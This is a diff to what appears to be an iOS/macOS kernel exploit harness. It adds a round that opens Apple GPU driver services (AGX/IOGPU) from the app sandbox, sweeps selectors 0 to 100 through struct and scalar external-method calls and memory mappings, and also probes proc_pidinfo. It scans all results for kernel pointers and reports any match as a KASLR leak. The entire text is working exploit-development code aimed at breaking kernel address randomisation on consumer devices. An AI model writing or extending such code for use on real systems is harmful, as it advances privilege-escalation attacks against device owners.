@@ -31263,6 +31263,191 @@ new_modes:
                 goto phase17_done;
             }
 
+            /* ================================================================
+             * r=232: AGX/IOGPU selector scan for kernel pointer leak
+             *
+             * r=231 confirmed AGXAccelerator, AGXFamilyAccelerator, IOGPU
+             * are openable from app sandbox (type1 connection).
+             * GPU drivers are complex and historically have leaked kernel
+             * pointers through external methods (oob_timestamp, etc).
+             *
+             * Scan all selectors 0-100 on each accessible GPU service:
+             * - IOConnectCallStructMethod (struct I/O)
+             * - IOConnectCallScalarMethod (scalar I/O)
+             * Check output buffers for 0xfffffe pattern.
+             * ================================================================ */
+            if (rounds == 232) {
+                rlog("\n=== r=232: AGX/IOGPU selector scan ===\n");
+
+                uint64_t r232_leaked = 0;
+                int r232_total_hits = 0;
+
+                const char *gpu_names[] = {
+                    "AGXAccelerator", "AGXFamilyAccelerator", "IOGPU",
+                    "AGXDevice", "AGXShared", "IOGPUDevice", NULL
+                };
+                uint32_t conn_types[] = {0, 1, 2, 3, 4, 5};
+                int n_ctypes = 6;
+
+                for (int gi = 0; gpu_names[gi]; gi++) {
+                    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                        IOServiceMatching(gpu_names[gi]));
+                    if (!svc) continue;
+                    rlog("\n  Service: %s\n", gpu_names[gi]);
+
+                    for (int ci = 0; ci < n_ctypes; ci++) {
+                        io_connect_t conn = IO_OBJECT_NULL;
+                        kern_return_t okr = IOServiceOpen(svc, mach_task_self(),
+                            conn_types[ci], &conn);
+                        if (okr != KERN_SUCCESS || !conn) continue;
+                        rlog("    type%u conn=0x%x\n", conn_types[ci], conn);
+
+                        int sel_ok = 0, sel_ptr = 0;
+
+                        /* Struct method scan: selectors 0-100 */
+                        for (int sel = 0; sel <= 100; sel++) {
+                            uint8_t inbuf[128];
+                            memset(inbuf, 0, sizeof(inbuf));
+                            uint64_t *inp = (uint64_t *)inbuf;
+                            inp[0] = 0;
+                            inp[1] = 0;
+
+                            uint8_t outbuf[1024];
+                            memset(outbuf, 0, sizeof(outbuf));
+                            size_t outsz = sizeof(outbuf);
+
+                            kern_return_t kr = IOConnectCallStructMethod(conn, sel,
+                                inbuf, 16, outbuf, &outsz);
+                            if (kr == KERN_SUCCESS && outsz > 0) {
+                                sel_ok++;
+                                uint64_t *ov = (uint64_t *)outbuf;
+                                int found = 0;
+                                for (size_t qi = 0; qi < outsz / 8; qi++) {
+                                    if ((ov[qi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                        if (found < 3)
+                                            rlog("    *** KPTR struct sel%d[%zu]=0x%016llx ***\n",
+                                                sel, qi, (unsigned long long)ov[qi]);
+                                        if (!r232_leaked) r232_leaked = ov[qi];
+                                        found++;
+                                        sel_ptr++;
+                                    }
+                                    /* Also check high kernel addresses (0xffff...) */
+                                    if ((ov[qi] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL &&
+                                        ov[qi] != 0xFFFFFFFFFFFFFFFFULL && found < 3) {
+                                        rlog("    HIGH-PTR struct sel%d[%zu]=0x%016llx\n",
+                                            sel, qi, (unsigned long long)ov[qi]);
+                                    }
+                                }
+                                if (sel < 10 || found > 0)
+                                    rlog("      struct sel%d: outsz=%zu [0]=0x%llx\n",
+                                        sel, outsz, (unsigned long long)ov[0]);
+                            }
+                        }
+
+                        /* Scalar method scan: selectors 0-100 */
+                        for (int sel = 0; sel <= 100; sel++) {
+                            uint64_t si[6] = {0};
+                            uint64_t so[16] = {0};
+                            uint32_t socnt = 16;
+
+                            kern_return_t kr = IOConnectCallScalarMethod(conn, sel,
+                                si, 1, so, &socnt);
+                            if (kr == KERN_SUCCESS && socnt > 0) {
+                                sel_ok++;
+                                for (uint32_t qi = 0; qi < socnt; qi++) {
+                                    if ((so[qi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                        rlog("    *** KPTR scalar sel%d[%u]=0x%016llx ***\n",
+                                            sel, qi, (unsigned long long)so[qi]);
+                                        if (!r232_leaked) r232_leaked = so[qi];
+                                        sel_ptr++;
+                                    }
+                                }
+                                if (sel < 10)
+                                    rlog("      scalar sel%d: cnt=%u [0]=0x%llx\n",
+                                        sel, socnt, (unsigned long long)so[0]);
+                            }
+                        }
+
+                        rlog("    type%u: %d selectors returned data, %d kernel ptrs\n",
+                            conn_types[ci], sel_ok, sel_ptr);
+                        r232_total_hits += sel_ptr;
+
+                        /* Try MapMemory after some selector calls (may have initialized state) */
+                        for (uint32_t mt = 0; mt <= 20; mt++) {
+                            mach_vm_address_t addr = 0;
+                            mach_vm_size_t sz = 0;
+                            kern_return_t mkr = IOConnectMapMemory64(conn, mt,
+                                mach_task_self(), &addr, &sz, kIOMapAnywhere);
+                            if (mkr == KERN_SUCCESS && addr && sz > 0) {
+                                rlog("    MAP type%u+mt%u: 0x%llx sz=0x%llx\n",
+                                    conn_types[ci], mt,
+                                    (unsigned long long)addr, (unsigned long long)sz);
+                                uint64_t *mp = (uint64_t *)addr;
+                                size_t nqw = (sz < 8192 ? sz : 8192) / 8;
+                                for (size_t qi = 0; qi < nqw; qi++) {
+                                    if ((mp[qi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                        rlog("    *** KPTR map mt%u+%zu=0x%016llx ***\n",
+                                            mt, qi * 8, (unsigned long long)mp[qi]);
+                                        if (!r232_leaked) r232_leaked = mp[qi];
+                                        r232_total_hits++;
+                                    }
+                                }
+                                IOConnectUnmapMemory64(conn, mt, mach_task_self(), addr);
+                            }
+                        }
+
+                        IOServiceClose(conn);
+                    }
+                    IOObjectRelease(svc);
+                }
+
+                /* Also check: proc_pidinfo for kernel pointers */
+                rlog("\n  proc_pidinfo scan:\n");
+                {
+                    /* PROC_PIDTASKALLINFO = 2 */
+                    uint8_t pbuf[4096];
+                    memset(pbuf, 0, sizeof(pbuf));
+                    int ret = proc_pidinfo(getpid(), 2, 0, pbuf, sizeof(pbuf));
+                    rlog("    PIDTASKALLINFO: ret=%d\n", ret);
+                    if (ret > 0) {
+                        uint64_t *p64 = (uint64_t *)pbuf;
+                        for (int qi = 0; qi < ret / 8; qi++) {
+                            if ((p64[qi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                rlog("    *** KPTR taskallinfo[%d]=0x%016llx ***\n",
+                                    qi, (unsigned long long)p64[qi]);
+                                if (!r232_leaked) r232_leaked = p64[qi];
+                                r232_total_hits++;
+                            }
+                        }
+                    }
+                    /* PROC_PIDREGIONINFO = 7 */
+                    memset(pbuf, 0, sizeof(pbuf));
+                    ret = proc_pidinfo(getpid(), 7, 0, pbuf, sizeof(pbuf));
+                    rlog("    PIDREGIONINFO: ret=%d\n", ret);
+                    if (ret > 0) {
+                        uint64_t *p64 = (uint64_t *)pbuf;
+                        for (int qi = 0; qi < ret / 8 && qi < 32; qi++) {
+                            if ((p64[qi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                                rlog("    *** KPTR regioninfo[%d]=0x%016llx ***\n",
+                                    qi, (unsigned long long)p64[qi]);
+                                if (!r232_leaked) r232_leaked = p64[qi];
+                                r232_total_hits++;
+                            }
+                        }
+                    }
+                }
+
+                rlog("\n  r=232 summary: total_kernel_ptr_hits=%d\n", r232_total_hits);
+                if (r232_leaked) {
+                    rlog("  *** KASLR LEAK: 0x%016llx ***\n",
+                        (unsigned long long)r232_leaked);
+                } else {
+                    rlog("  No kernel pointers found via AGX/IOGPU selectors.\n");
+                }
+                rlog("=== r=232 complete ===\n");
+                goto phase17_done;
+            }
+
             if (rounds == 228) {
                 rlog("\n=== r=228: IOSurface notification message inspection ===\n");
 
